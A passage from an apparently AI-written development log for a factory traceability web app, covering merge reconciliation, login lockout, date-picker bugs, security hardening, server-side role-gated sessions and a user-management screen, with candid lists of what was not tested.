  `rerender()`'s own min-setting the moment a field was focused. None of
  this was caught because none of it was run against the actual running
  code - see Round 19 below, which found all of it exactly that way.

## Round 19 - Stage 1a finish-up

A rewrite of the Round 19 prompt itself replaced every earlier version of
it: Round 18 said "What I could not run: Nothing" and the items below were
checked against the *running* code, found not done or done wrong, and
fixed one numbered section at a time - each as its own commit.

**Before any of it:** an unrelated problem first. `origin/main`'s
independent Gate Pass rebuild (landing list, multi-item, edit) had been
merged into this branch's history (`c5cb1ed`) with the conflict resolution
favouring `origin/main`'s side almost everywhere the two lines overlapped -
`static/icon_live.js` ended up 1008 lines closer to `origin/main`'s version
than to this branch's own. Reverted to this branch's pre-merge content for
every file that merge had touched (`app.py`, `db.py`, `schema_sqlite.sql`,
`static/icon_live.js`, `templates/gatepass_print.html`, and the
`test_gatepass`/`test_loading`/`test_packing`/`test_repack`/`test_challan`/
`test_fqc_dashboard` files) as a forward-fix commit, not a history rewrite -
the branch was already pushed. `icon_auth.py`/`auth_lab/`/
`test_icon_auth.py` were never touched by the merge in the first place -
they only ever existed on this branch, so there was no conflict to
resolve for them.

**1. Repo hygiene** - `.gitignore`, `DATA_LAYER.md`'s NUL/CRLF corruption
and `routes.txt` were already fixed by this branch's own earlier hygiene
commit. What was still open: `auth_lab/.gitignore` (UTF-16, redundant -
root `*.db` covers `auth_lab/lab.db`) deleted; `DATA_LAYER.md` documented
the `ICON_ALLOW_RESET` opt-in guard, which existed in code but was never
written down; `README_DEPLOY.md` had a genuinely broken code fence
(` ``ash ` / trailing `` ` `` instead of ` ```bash ` / ` ``` `);
`PROJECT_OVERVIEW.md` had real corruption from an earlier write script - a
literal BEL (0x07) had eaten the "a" off "auth_lab/", and a literal tab
had eaten the "t" off every "test_*.py" filename - plus a duplicate "## 9."
heading and stale test counts, all fixed and the counts verified with
`pytest --collect-only`.
Test: `test_repo_hygiene.py` (3 tests, unchanged, still green).

**2. Lockout - the escalation plan** - entirely unimplemented before this
round (see Round 18's corrected "What I could not run" above).
Implemented as designed: `COOLDOWN_STEPS = (2, 4, 8)`, keyed by the
normalised typed ID for every role and unknown IDs, enforced as a refusal
on the next request rather than a `time.sleep()` (Waitress runs several
worker threads; a sleep in the request path would hold one and, under
enough parallel bad logins on one ID, freeze the app for everyone), no
reveal on a correct credential during a lock or a cooldown. Browser-side:
a client-only failed-attempt counter and a countdown-disabled Sign In
button, both rendered from the server's own constants. Two real bugs found
only by testing this live in Chromium: a reload was re-incrementing the
counter (`?err=` stays in the URL - fixed with `history.replaceState`),
and the fix for that then lost the count entirely on reload (the ID field
comes back empty - fixed by restoring the last-tried ID from
`sessionStorage` on every load).
Tests: `test_icon_auth.py::test_15_cooldown_escalation` (2/4/8/8 sequence
with injected `now`, an in-cooldown attempt not counted, identical across
a Super Admin/Admin/operator/unknown ID) and `::test_16_cooldown_not_a_sleep`
(12 parallel failed logins finish in under 3 s). `test_auth_lab_lockout.py`
(already committed on this branch, untouched) turned out to specify the
UI more precisely than a first draft here did - one shared counter, the
line inside the existing error box, the exact 2/4/8 timing - and is what
caught both bugs above once this was aligned to it.

**3. Date pickers** - `rerender()`'s own data-future handling was correct,
but a second mechanism, `document.addEventListener('focus', ...)` outside
the module at the very end of the file, set `max=today` on every date
input on focus regardless of `data-future`, overriding `rerender()`'s
min-setting the moment the field was touched. Factored both into one
function, `_applyDateLimit`. Also removed `produced_on`'s data-future
special-case from Round 18 (backwards: a production entry records a shift
that already happened, so a past date must work and a future one should
be refused - the original `max=today` behaviour).
Verified in real Chromium against the running app, not by reading the
code: focused Indent's "Delivery by" (`data-future`) - min became today,
no max, tomorrow accepted; focused Production Entry's date field (plain) -
max became today, no min, its existing past-dated value was retained.
`test_challan.py` (55) and `test_loading.py` (10) unaffected.

**4. Security defects** - 4a (admin promotion) and 4b (adaptive timing)
were already committed separately on this branch and untouched here. 4c,
4d, 4e and 4f had been done once, in an in-progress state, and then lost
to an unrelated git operation earlier in this session; recovered from two
untracked test files that had survived it (`test_security_4c.py`,
`test_security_4e.py` - both failing against the code at the time,
confirming the loss) and reimplemented against them.
- 4c: `auth_lab/lab_app.py` had zero `html.escape()` calls. Every
  interpolated value is now escaped, including the stored-XSS vector
  (`display_name` in the admin users table) and the enrol-token URL
  embedded in a `<script>` tag (JS-string-context injection, not just
  HTML - fixed with `json.dumps()` rather than hand-quoting).
- 4d: an unknown `login_id` is masked to its first 2 characters + a length
  before being logged, so a password typed into the wrong field is never
  stored in the clear.
- 4e: `hash_token` is now HMAC-SHA256 keyed by the same Fernet key that
  protects TOTP secrets, covering enrol tokens and recovery codes alike.
- 4f: `clock_status()` is checked once at import in a background thread
  and cached, refreshed at most every 15 minutes, instead of running a
  blocking SNTP check (up to its 2 s timeout) on every page load and every
  `/healthz` poll.
Tests: `test_security_4c.py`'s own assertion was wrong on top of the fix
being absent - "HACKED" not in the page can never pass, since the escaped,
inert payload's own text still contains the word "HACKED"; rewritten to
check the page's DOM is still intact (proving the script never ran) and
that the payload renders escaped. It also tried to log in as a Super Admin
with a password, which `icon_auth.login()` blocks by design; rewritten to
use a real TOTP code. `test_security_4a.py` and `test_security_4e.py`
needed `store.DB_PATH` set directly, not just the `ICON_DB_FILE` env var -
both are module-level globals fixed at first import within a pytest
session, and `test_icon_auth.py`'s own fixture already works around this
the same way.

**5. Tests** - `test_auth_lab_live.py` was already split (this branch's
own earlier round); one assertion needed updating for Round 19's new
counter (two page loads a moment apart are no longer byte-identical DOM
once a live counter exists in one of them - reset it between the two
attempts under comparison, which is what the assertion actually needs to
prove).

**6. BACKLOG** - Round 18's "rank 1 over rank 1" corrected to "rank 2 over
rank 2" (the bug was Admin acting on Admin), "14 tests passing" corrected
to 17, and "Nothing" not run corrected to an honest list, above. Section
21's Decisions rewritten to the actual plan - not "told how long only when
the credential was CORRECT" (the earlier text here), which is exactly the
oracle this refuses to be.

**Which tests prove it, all together:** `python -m pytest test_icon_auth.py
test_repo_hygiene.py test_security_4a.py test_security_4c.py
test_security_4e.py` - 25 passed. `test_auth_lab_live.py` and
`test_auth_lab_lockout.py` (Playwright, real Chromium) - both passed,
separately. `test_challan.py` (55) and `test_loading.py` (10) - unaffected
by the date-picker change, both still passed.

**What I could not run:**
- The full parallel-load claim from the original spec ("12 parallel failed
  logins... under 3s") is covered directly by
  `test_16_cooldown_not_a_sleep`; the broader concurrent-request behaviour
  of the lab app itself under Waitress (rather than icon_auth.login()
  called directly, as that test does) was not separately load-tested.
- `node --check static/icon_live.js` - Node is not installed in this
  environment (as PROJECT_OVERVIEW.md's own testing section already says
  to expect). Verified instead in real headless Chromium via Playwright
  against the actual running app, which is a stronger check for this
  specific bug (it was a `focus` event listener) than a syntax check would
  have been.
- Recovery-code comparison is HMAC-keyed now (4e) but still compared via a
  SQL `WHERE` equality rather than an explicit constant-time comparison in
  Python; the stated threat ("a stolen database alone must not yield them")
  is addressed, but the comparison itself was not hardened further.
- Whether an Admin can create a new Admin account outright via
  `create_admin` (as opposed to promoting an existing operator via
  `update_user`, which 4a already restricts) was not investigated - an
  existing test, `test_icon_auth.py::test_14b_create_admin`, asserts this
  currently works and passes; whether it should is a product question, not
  one this round's scope (section 4a named `update_user` specifically) or
  time covered.

## Round 20 — Production Entry's "undefined" toast, a dead Shift Incharge/Line selector, and the FQC-before-paperwork gap

Mukesh reported "Record production" toasting "Record undefined modules as
produced." on a real serial. Checked the real database directly rather than
guessing: `ICON625R1290710000` genuinely existed with `state='rejected'` -
the server had correctly refused the save, and two separate, real bugs in
`icon_live.js`'s `peSave()` turned that refusal into a nonsense success
toast and closed the form as if nothing was wrong.

**Bug 1 - the refusal never reached the screen.** `peSave()`'s `.then()`
unconditionally read `toast('Recorded ' + r.qty + ' modules as
produced.')` and closed the form, with no check of `r.ok` first - every
other save handler in this file follows `if (!r.ok) { toast(r.why);
return; }`, this one didn't. A refusal body has no `qty`, hence
"undefined", and the form collapsed as if the save had gone through.
Fixed to match the file's own established idiom - the real `why` now
shows in the status box, and the form stays open with what was typed.

**Bug 2 - Shift Incharge and Line were never actually sent.** Found while
fixing bug 1: `peSave()` read them with
`document.querySelector('#peManual select:nth-of-type(2)')` /
`nth-of-type(3)`. `:nth-of-type(n)` counts siblings under the SAME
parent - each of these three `<select>`s sits alone in its own `.fld`
div, so all three are independently `nth-of-type(1)`, and nothing was
ever `nth-of-type(2)` or `(3)`. Incharge and Line were silently posted as
empty strings on every save, regardless of what the dropdowns visibly
showed - the server then correctly refused "Missing required fields.",
which bug 1 then papered over the same way. Live in the real database,
`production_entry` had zero rows - no save had ever actually succeeded
through this form. Fixed by reading all three selects by position within
their shared grid (`#peManual .grid.g3 select`) instead.

**The deeper question this raised.** Once bug 1 surfaced the server's real
refusal text ("Serials are already produced or graded"), Mukesh pointed
out the real practical sequence: Indent -> Planning -> Production Entry ->
FQC -> Packing -> Challan -> Dispatch, and that Production Entry is filed
at *shift end* while individual modules physically reach the FQC station
throughout the shift - often before that paperwork exists. A module
cannot be graded at all unless it was made, so a serial FQC already
graded or rejected is proof of production, not a conflict with recording
it; refusing the whole shift's range because FQC beat the paperwork to a
few modules was the actual bug.

The reason `state != 'planned'` was ever used as the "already recorded"
check is that, before this round, `state` never moved without a
production entry causing it. FQC's own `record_fqc()` set it to
'graded'/'rejected' regardless of whether production entry had run for
that serial, which conflates two different facts into one column: what
stage a serial has reached, and whether its shift's paperwork exists.
Untangled by adding `serial.prod_entry_id` (nullable, set only by
`api_prodentry`, migrated in `store.py`'s existing `_migrate()`) as the
one thing that means "already recorded" - independent of whatever FQC or
packing has done since. `api_prodentry` now refuses only on
`prod_entry_id IS NOT NULL`; on success every serial in the range gets
`prod_entry_id` set (so a second entry over the same range is still
correctly refused), but `state` only advances to `'produced'` for a
serial still `'planned'` - one FQC already graded stays exactly where
FQC left it, never regressed backwards.

Confirmed live, in a browser, against the actual reported scenario: a
6-serial range where two serials were already `rejected`/`graded` (FQC
ahead of paperwork) now records successfully, the two FQC-decided serials
keep their real state, the four still-planned ones move to `produced`,
and all six now carry `prod_entry_id`.

**Which tests prove it.** `test_production.py`'s existing "already
produced" test rewritten to simulate the real mechanism - a genuine prior
`/api/prodentry` call, not a hand-set `state` - since a hand-set state no
longer means anything to this check. New test locks in the FQC-ahead
scenario explicitly: the entry succeeds, the FQC-decided serial's state
is untouched, and all five serials (FQC-decided included) end up carrying
the new entry's id. Full suite re-run: `test_production.py` 7/7 (was 6,
minus one rewritten, plus one new), `test_fqc.py`, `test_fqc_override.py`,
`test_packing.py`, `test_repack.py`, `test_challan.py`, `test_loading.py`,
`test_gatepass.py`, `test_gatepass_multiitem.py`, `test_indent.py`,
`test_search_invoice.py`, `test_review.py`, `test_loss.py`,
`test_evidence.py` all green; the one pre-existing, unrelated
`test_fqc.py` failure already tracked this session is unchanged. Migration
verified against the real `icontrace.db` directly - `prod_entry_id`
appears on `PRAGMA table_info(serial)` with no data loss.

Considered and explicitly rejected: a hard gate on FQC requiring
`state == 'produced'` before grading. Mukesh's own call - Production
Entry is shift-end paperwork, and a module that physically reaches FQC
before that paperwork is filed must still be inspectable on time.

---

## Round 22 - Gate Pass reconciliation after a silently-incomplete merge

**What the earlier revert actually did to git's ancestry, not just the
files.** `dd25bfa` ("Revert icon_trace/Gate Pass content pulled in by
c5cb1ed merge") put this branch's pre-rebuild Gate Pass code back -
`app.py`, `db.py`, `static/icon_live.js`, `schema_sqlite.sql`,
`templates/gatepass_print.html`, and the Gate Pass test files - after an
earlier merge (`c5cb1ed`) had pulled in main's independent Gate Pass
rebuild (multi-item, the landing list, `api_loading_submit` auto-creating
the record) and the conflict resolution favoured main's side almost
everywhere. A revert commit does not remove anything from history: the
merge and everything before it stayed exactly where it was, an ancestor
of the branch tip from that point on. That is the detail that made the
later merge misbehave - not a mistake in the revert itself, which did
what it said.

**Why Round 21's `Merge origin/main` reported clean while still missing
main's actual current Gate Pass code.** By the time that merge ran, the
computed merge-base between the branch and `origin/main` was a commit at
or after `c5cb1ed` - a point in history where the rebuild was already
present on *both* sides. Between that base and `origin/main`'s new tip,
the Gate Pass files had barely moved (main's own later work was FQC/EL/
Production Entry, elsewhere). Between that same base and the branch's
tip, `dd25bfa` had changed them enormously - reverting the rebuild back
out. A three-way merge with one side unchanged and the other side
changed takes the changed side, no contest, no conflict marker, nothing
to report. Git was correct that nothing was *contested*; it was not
correct that the result matched what either line of work currently
wanted. `test_gatepass.py` and `test_loading.py` carried through the
merge as the branch's own reverted, pre-rebuild versions too, so they
kept passing against code that had gone backwards - a merge and its own
tests agreeing is not the same claim as the merge being right, and nothing
short of diffing against main's actual current tip file-by-file would
have caught it.

**The general lesson.** A clean merge only proves nothing was contested
between the two side's changes since their shared base. It does not prove
the result matches either side's current intent - especially once an
earlier revert has put a stale version of something back into the branch
that a later merge-base will treat as "already agreed."

**Files touched this round, by section:**

- *Section 1 (taken wholesale from `origin/main`, confirmed zero diff
  after):* `db.py`, `schema_sqlite.sql`, `templates/gatepass_print.html`,
  `README.md`, `test_gatepass.py`, `test_gatepass.js`,
  `test_gatepass_landing.js` (restored - existed only on main's line),
  `test_gatepass_multiitem.py` (restored), `test_gatepass_screen.py`
  (restored), `test_loading.py`, `test_loading.js`, `test_challan.js`,
  `test_fqc_dashboard.js`, `test_packing.js`, `test_repack.js`.
- *Section 2 (checked, correctly left alone):* `templates/frag_settings.html`
  (Stage 0's reset-guard UI - main predates it), `templates/indent_new.html`,
  `templates/frag_indent_form.html`, `templates/gatepass.html` (all three
  already carry `data-future="1"`, main does not).
- *Section 3 (`app.py`, hand-reconciled with the branch as base):* added
  `_validate_gp_items()`, `_clamp_gp_date_range()`,
  `GET`/`PUT /api/gatepass/<id>`; replaced the bodies of `api_gatepasses()`,
  `api_gatepass()`, `api_loading_submit()` with main's current versions
  (the auto-create-on-submit behaviour, the duplicate-challan refusal).
- *Section 3 follow-up (found only by running the real suite, not listed
  in this round's own instructions):* `gatepass_print()` still only read
  the `gatepass` row and never fetched `gatepass_item` rows -
  `test_gatepass_multiitem.py`'s print test caught a new multi-item
  standalone gate pass printing with its item lines silently missing.
  Fixed the same way as the three functions this round did name: main's
  version, verbatim.
- *Section 4 (`static/icon_live.js`, hand-reconciled with main as the new
  base):* checked out main wholesale (restores the entire multi-item
  rebuild the branch had lost), replaced main's crude UTC-only max-date
  block with a call to `_applyDateLimit`, restored `_applyDateLimit()`
  and its capturing focus listener verbatim from
  `origin/stage0-build-banner~1`, added `data-future="1"` to the rebuilt
  form's `#gpExpectedRet` input.
- *Section 4 follow-up (also found only by running the real suite):*
  main's `ping()` still compared `d.boot_build`, the old combined hash -
  a second branch-original fix in this same file this round's own
  instructions did not name (they called out only `_applyDateLimit`).
  `test_build_banner.py::H_no_consumer_reads_d_boot_build` caught it.
  Restored verbatim from the same `~1` commit: `isAdmin` requiring `#app`
  to carry the `"on"` class (no stale banner on the sign-in screen after
  sign-out) and including Super Admin, and the reload-banner comparison
  going back to `d.build` vs `B.build` gated on `signedIn`.

**Verification, real not assumed.** `test_gatepass.py` 11/11,
`test_loading.py` 14/14, `test_gatepass_multiitem.py` 9/9,
`test_gatepass_screen.py` 4/4 (real Chromium via Playwright - the rebuilt
multi-item UI, the live summary trail, auto-create-on-submit), full
Section 6 suite green except `test_fqc.py`'s one pre-existing, unrelated
failure (unchanged, present before this round). A dedicated real-browser
pass (screenshots, then deleted) confirmed: the New Gate Pass screen
shows the rebuilt item table and "+ Add item"; `#gpExpectedRet` accepts
tomorrow (`min` set, no `max`) while Production Entry's date field still
refuses it (`max` = today, no `data-future`); creating a challan, loading
every box and submitting auto-creates the gate pass with no manual POST,
and a manual POST against that same challan afterward is refused with
the exact reason text. Node is not installed on this machine; the two
`node` commands this round's instructions specified
(`test_gatepass.js`, `test_gatepass_landing.js`) were run instead via
`cscript //E:JScript`, the documented fallback - both green.

Two real regressions surfaced only because the required verification
step (running the actual suite, not trusting the file list) was followed
- exactly the failure mode this round exists to close out.

---

## Round 23 - Stage 1b: real sessions, server-side role() and actor(), 49 endpoints gated

**What was actually wrong.** Every write endpoint trusted two client-sent
headers: `X-User-Name` for who was acting (recorded in every audit row)
and `X-User-Role` for what they were allowed to do. Anyone with devtools
could set either to anything. Five endpoints checked a role at all; the
other forty-odd were open to anybody who could reach the port. The login
screen was a dropdown of fourteen names and a password box with eight
dots painted into its `value`; picking a name set `USER`, a plain
JavaScript object, and the server believed whatever the page then sent.
v4's own note said so out loud: *"Authentication is designed, not yet
built."* It is built now.

**The shape of the fix.** A real `auth_session` row, keyed by an
unguessable `secrets.token_hex(32)`, carried in an HttpOnly `icon_sid`
cookie (deliberately a different cookie from Flask's own `session`, which
this app already uses for pending invoice uploads). `before_request`
loads it onto `g.icon_session` and blocks nothing by itself;
`require_role()` on each write endpoint is what refuses. `role()` and
`actor()` read that session and nothing else.

**The idle rule, stated plainly because it will surprise someone.** The
window is 5 minutes for Admin and Super Admin, 1 hour for everyone else,
and it is extended ONLY by a state-changing request that actually
succeeded. Navigating between screens does not reset it. Somebody who
reads for the whole window is signed out even though they were sitting
right there - deliberate, not a bug to fix later. The popup in the last
two minutes says this in as many words, because the alternative is people
discovering it by losing a form.

**Why a refused request does not extend a session.** The touch happens in
`after_request`, keyed on `status < 400` - the same rule `_sync_guard`
already applies to replay. A request that was refused for any other
reason has not demonstrated anybody is there; extending on it would mean
a forbidden endpoint, hammered, could keep a session alive indefinitely.

### The endpoint-to-role map

Built against the screen each endpoint serves, cross-referenced with
`ROLES` in `icon_trace.html` plus the views `icon_live.js` grants at
runtime (`challan-list`/`gp-list`/`gp-new`, `loading-list`/`loadsession`,
and `review` for Production Incharge) and the `Quality` role that file
creates outright, which v4 never had.

| Endpoints | Allowed roles |
|---|---|
| `/api/box/open`, `/api/box/<id>/{scan,remove,close,capacity,abandon,repack}`, `/api/repack`, `/packing` | Packing Operator, Admin, Super Admin |
| `/api/loading/<id>/{confirm,submit}` | Dispatch Operator, Packing Operator, Admin, Super Admin |
| `/api/challan`, `/api/challan/checks`, `/api/challan/<id>/{submit,discard,cancel,edit-draft,edit-save}`, `/api/gatepass`, `/api/gatepass/<id>`, `/api/invoice/{parse,confirm}`, `/invoice/{parse,confirm,cancel}`, `/dispatch`, `/gatepass` | Dispatch Operator, Admin, Super Admin |
| `/api/indent`, `/api/indent/<no>`, `/indent/new`, `/api/allocation`, `/api/allocation/<id>`, `/api/allocation/<id>/update`, `/planning`, `/api/prodentry`, `/api/loss_event`, `/api/loss_event/<id>/close` | Production Incharge, Admin, Super Admin |
| `/api/fqc`, `/fqc` | FQC Operator, Admin, Super Admin |
| `/api/quality` | Quality, Admin, Super Admin |
| `/admin/challan-import` (view, and the CHECK phase) | Admin, Super Admin |
| `/api/material` (POST+PUT), `/api/cell-efficiencies`, `/api/db/reset`, `/api/settings`, `/settings` (the POST), `/admin/challan-import` (the LOAD phase) | **Super Admin alone** |
| `/api/export/xlsx` | all seven roles |
| `/api/review/resolve` | per branch - see below |

Super Admin is included wherever Admin is, because it outranks Admin
(`icon_auth.ROLE_RANK`) and an allow-list that left it out would lock the
highest-privileged account out of ordinary work. The reverse does not
hold: master data is Super Admin ALONE, so an Admin can still read the
materials list but not write it. `/api/db/reset` keeps Stage 0's
`ICON_ALLOW_RESET` guard as well - both apply, neither replaces the
other, and they refuse for visibly different reasons.

**Settings moved to Super Admin alone (follow-up).** `/api/settings` was
first gated at Admin on the reading that it was general configuration. It
is not: what it writes is `grade_a_min`/`grade_b_min`, the per-line
`ss_csv_path` and `el_root`, and the SS column map. Those decide what
counts as an A grade, where evidence is read from, and which column of
the export is Pmax - the same bucket as materials and cell efficiencies,
and the architecture decision groups it there explicitly. Getting one
wrong does not fail loudly; it silently mis-grades or mis-reads every
module after it.

`/settings`, the HTML form, writes the SAME `DEFAULT_CONFIG` keys through
the same `db.set_config()`. Gating only the JSON route would have left
the restriction trivially bypassable by posting the form instead, so both
moved together. The route itself stays reachable by Admin: master data is
Super Admin to WRITE, not to look at, and the page's own read of what is
configured is worth keeping open.

**`/admin/challan-import`: split by phase, not left whole.** This was a
genuine open question rather than a correction - it is not named in the
architecture list, though that list's "DB reset/import/system tools"
plausibly means this, since `icon_challan_import.py` is the only importer
in the repo. Answered by what the two phases actually do, which the route
already separates: CHECK reads every workbook and writes nothing, LOAD
writes a batch of historical challans, boxes and serials straight in,
bypassing the quantity reconciliation, loading verification and invoice
match the normal Create Challan path enforces. A bad batch is expensive
to unwind, and a half-loaded history is worse than none - the route's own
docstring says so.

So CHECK stays Admin and LOAD is Super Admin: an Admin can prepare a
batch and see in full what it would do, and a Super Admin commits it.
That is the same read/write line drawn everywhere else in this bucket,
and it does not make Mukesh personally run the preparation for every
batch of history - only the moment it enters the record. A refused LOAD
still renders the whole report, but answers 403 rather than 200, so
"refused" is never mistaken for "ran and found nothing to do".

`/api/review/resolve` could not become a single decorator: which role is
allowed depends on the item type, and for a duplicate scan on whether the
serial has already been dispatched. Its four pre-existing checks now call
`_require_role()`, the inline counterpart with the same two outcomes,
each keeping its own wording and its exact existing allowed-role set -
`("Quality", "Admin")`, `("Production Incharge", "Admin")` and `Admin`
alone. Who they permit is unchanged; only how it is checked. The route
also carries a blanket decorator so it answers 401 like every other
write.

### What proves each part

- Section 1 (the table and its five functions) - `test_session_auth.py`,
  including a session loaded back by a genuinely separate Python process
  against the same file, which is what "real, not in memory" means.
- Sections 2-3 (before_request, role(), actor(), the routes) - the same
  file: 401 with no cookie and with an expired one, a GET provably not
  extending a session while a successful POST does, a full login ->
  authenticated call -> logout -> same cookie now refused flow, and a
  grep asserting zero remaining `X-User-Role`/`X-User-Name` reads.
- Section 4 (the gates) - `test_role_gates.py`, which reads the map back
  out of `app.py`'s own decorators so it cannot drift from what is
  deployed, then proves all 49 endpoints x 3 identity states. It also
  proves the original vulnerability specifically: a forged
  `X-User-Role: Super Admin` header does not promote an FQC Operator, and
  the audit trail records the session's real name rather than a forged
  `X-User-Name`.
- Section 6 (the login screen) - `test_login_screen.py`, in real
  Chromium.

### Two real bugs this work surfaced

`/api/db/reset` answered 500, not 200. `store.wipe()` deletes the file
and rebuilds `schema_sqlite.sql`'s tables only, so a reset took
`app_user` and `auth_session` with it; the after_request hook then died
on *no such table: auth_session*, and every later request carrying a
cookie would have died the same way. A reset empties the data - it must
not leave the server unable to answer.

The session-touch hook could turn a completed save into a 500. It is
housekeeping, running after the work is already committed and answered,
so it now logs and moves on. The worst case is somebody signing in again
sooner than they expected, which is the safe direction to fail in.

A third was self-inflicted and caught only by running the whole suite
rather than the file just edited: the new sign-in bypassed
`window.signIn()`, which `icon_live.js` wraps to hang its entire
bootstrap off (`applyBoot`, `addScreens`, the wirings). Four Playwright
files broke on screens that were no longer being registered at all. The
base function is now replaced early, before the wrapper captures it, so
the chain still runs in its original order - the same "patch v4's
functions, do not replace them" rule the overview states.

### Round 24 - honest state: not started

There is no user-management UI. `app_user` starts empty. Mukesh creates
the first Super Admin himself, locally, with

    python icon_auth_cli.py create-superadmin <his-login-id> "<his-name>"

which prints a one-time enrolment token he uses himself - no agent should
ever see it. Until Round 24 every other account is made the same way, and
there is no screen to deactivate someone, reset an enrolment, or bind a
station. The fourteen names in v4's `USERS` array have no accounts and
never will unless somebody creates them: that array and the `#who`
`<option>` list are dead markup, read by nothing, left in place only
because `icon_trace.html` may not be edited.

Also deferred, deliberately: `must_change_pw` and `must_reenrol` come
back from `icon_auth.login()` and the main app currently ignores both.
Only the lab acts on them. Nothing in this round asked for that flow, and
it needs a screen - which is Round 24's business.

---

## Round 23 follow-up - the bootstrap command sent Mukesh to an empty database

**What happened.** Following this round's own report, Mukesh ran
`python icon_auth_cli.py create-superadmin mknaik "Mukesh Naik"` (no
`ICON_DB_FILE` set), which correctly wrote the account into the real
`icontrace.db` and printed an Enrol URL on port 8091. He then started
`auth_lab/lab_app.py` (also no `ICON_DB_FILE` set) and opened that URL,
and got *"Invalid or expired token, or invalid user."* Re-running
`create-superadmin` for the same id then failed on
`UNIQUE constraint failed: app_user.login_id`, since the account was
already there - just not enrolled, and now with two tokens no server had
ever served.

**Root cause.** `icon_auth_cli.py` and the real app both default
`ICON_DB_FILE` to `icontrace.db`; `auth_lab/lab_app.py` defaults it to its
own `auth_lab/lab.db` - a different, normally-empty file, kept separate
on purpose so lab experiments never touch real data (the same reason
`test_auth_lab_live.py`/`test_auth_lab_lockout.py` point it at a fresh
tempfile per run). That separation is correct for the lab's actual job -
exercising the auth flow - but the CLI's printed Enrol URL always names
port 8091 with no mention of which database it just wrote to or that the
lab needs pointing at that same file to serve the token at all. The lab
is also the ONLY thing that serves `/enrol` - `app.py` has no such route
yet (Round 24) - so there was no way to complete enrolment against the
real database without already knowing to set `ICON_DB_FILE` on the lab
too, which nothing said to do. `sa1`, which Mukesh could sign into at
127.0.0.1:8091, was leftover data that has only ever existed in
`auth_lab/lab.db` - unrelated to `mknaik`, and proof of the same split.

**Fixed.** `icon_auth_cli.py`'s `create-superadmin`, `create-admin` and
`reset-totp` now print the real `store.DB_PATH` they just wrote to and
the exact command to start the lab against that same file, rather than a
bare Enrol URL that only works by coincidence. `list` prints which
database it is reading, for the same reason. `PROJECT_OVERVIEW.md`
section 10 now states both cases separately: running the lab as a
sandbox (both terminals share one throwaway `ICON_DB_FILE`, as before)
versus provisioning a real account (the lab must be pointed at the SAME
`icontrace.db` the CLI and the real app already share by default).

**Mukesh's unblock**, run now: `python icon_auth_cli.py reset-totp mknaik`
(both of the earlier tokens had expired by the time this was found - a
900-second TTL, not a bug) - then start the lab exactly as that command's
own output says, using the printed path, and open the Enrol URL it gives.
`mknaik` is already the right role (Super Admin) in `icontrace.db`; this
issues a fresh token against the same account, nothing is recreated.

**Checked and ruled out, not fixed here:** `test_auth_lab_live.py`,
`test_auth_lab_lockout.py` and `test_security_4c.py` all fail on this
machine with a Playwright timeout waiting on a `<strong>` locator on the
enrol page, even though a saved screenshot at the moment of failure shows
the page rendered correctly with that exact element present. Confirmed
unrelated to this fix by reverting `icon_auth_cli.py` to its pre-fix
state and reproducing the identical failure. All three share the
`lab_env` fixture, which spawns `auth_lab/lab_app.py` as a real
subprocess and drives it with Playwright - the common thread points at
that fixture or this machine's Playwright/subprocess interaction, not at
any test's own logic. Left for separate investigation; `test_icon_auth.py`
(19/19, no live browser) is unaffected.

---

## Round 24 - real user management screen

**What was there before.** The Users tab inside Admin rendered fourteen
fictional people out of v4's static `USERS` array - Mukesh, Rajesh Kumar,
Amit Sharma and the rest - every one shown **Active**, each with an Edit
button that opened a form over a record no server had ever heard of. The
accounts that could actually sign in were not on that screen at all.
Harmless while nothing was real; misleading the moment Round 23 made roles
real, because an Admin could reasonably believe they had just changed a
real account.

**What it is now.** `renderUsers()` is replaced outright - not patched -
and fetches `GET /api/users`. The markup is rebuilt too: v4's columns were
User ID / Name / Role / Line / Shift / Last sign-in, three of which
describe fields no account carries. Each row is an initials avatar, name
over login_id, role over station, a status tag (Active / `Locked - N min
left` / Deactivated), and the actions that target actually permits.

**Super Admin is excluded from `GET /api/users` for every viewer,
including a Super Admin looking at the screen themselves. This is Mukesh's
direct instruction, not an oversight.** Those accounts are created and
managed only through `icon_auth_cli.py`, run on the server, so listing
them on a screen that cannot act on them would mislead whoever is reading
it. The filter lives in app.py rather than inside `list_users()`, because
`icon_auth_cli.py` shares that function and legitimately needs to see
everyone. If this ever looks like a bug: it is not. The test that guards
it says so in its own name.

**Endpoints**, each a thin wrapper over the icon_auth function that
already enforces the hierarchy, all gated `@require_role(*_R_ADMIN)`:
`GET /api/users`, `POST /api/users`, and per account
`reset-password`, `reset-totp`, `unlock`, `deactivate`, `reactivate`.
`reactivate_user()` is new in icon_auth.py, mirroring `deactivate_user()`
exactly.

**Refusals disclose nothing new.** `_require_can_act_on()` raises
`"Not found."` for a hierarchy violation - byte-identical to what a
login_id that does not exist produces - and that wording is passed
through unchanged rather than improved on. reset-password checks the
target's role only AFTER that check, so its friendlier "use Reset TOTP
instead" cannot become a way of discovering that an account exists and
outranks you. Removing that ordering in a mutation test produced exactly
that leak.

**Which test proves what.** `test_users_admin.py` (20): the Super Admin
exclusion for both viewer roles; the rank filtering; no hashes or secrets
in the payload; minutes-left instead of a raw epoch; every action's happy
path, hierarchy refusal and gating; the create endpoint's every branch.
`test_users_screen.py` (6, real Chromium): the fourteen names gone from
the rendered page; a weak password refused on screen with the policy's own
sentence; an Admin account offering no password field and yielding a
copyable enrolment link; an Admin seeing "View only" where it may not act;
an Admin refused when calling the API directly rather than through a
button; deactivate/reactivate confirmed at `/login` itself.

**A finding worth recording.** This round's brief assumed
`icon_auth.create_admin()`'s hierarchy check already refused an Admin
creating another Admin. It does not - that function never calls
`_require_can_act_on()` at all, and `test_icon_auth.py:501` asserts
"Admin can create admin" as deliberate Stage 1a behaviour. So icon_auth
was left alone and the Super-Admin-only gate lives in the endpoint, as a
policy of this screen rather than of the library. Anyone tightening
`create_admin()` later should know they would be changing a tested
decision, not fixing an oversight.

**Open, and not decided here: should an Admin be scoped to accounts at
their own station or line?** This round does NOT scope by station - an
Admin sees every rank-1 account regardless of where it is stationed,
which is simply how `list_users()` already worked. That is a default
carried forward, not a considered decision, and it is recorded here so it
is not mistaken for one. If Unit-2 ever wants an FQC line lead who
administers only their own line's operators, this is the thing to revisit.


---

## Round 25 - a security fix, real enrolment, forced password change, card Users

### Section 1 is a security fix, not a feature

`create_admin()` never called `_require_can_act_on()`. It gated on
`actor_rank >= 2` alone, so an Admin could create a rank-2 peer - an
account it was then forbidden to touch, by the same rule that should have
stopped it creating one. `set_temp_password()`, `unlock_user()` and
`deactivate_user()` all call that check; this one did not.

Worse than a plain gap: `test_icon_auth.py` asserted **"Admin can create
admin"** with a comment saying so, which reads as a decision rather than
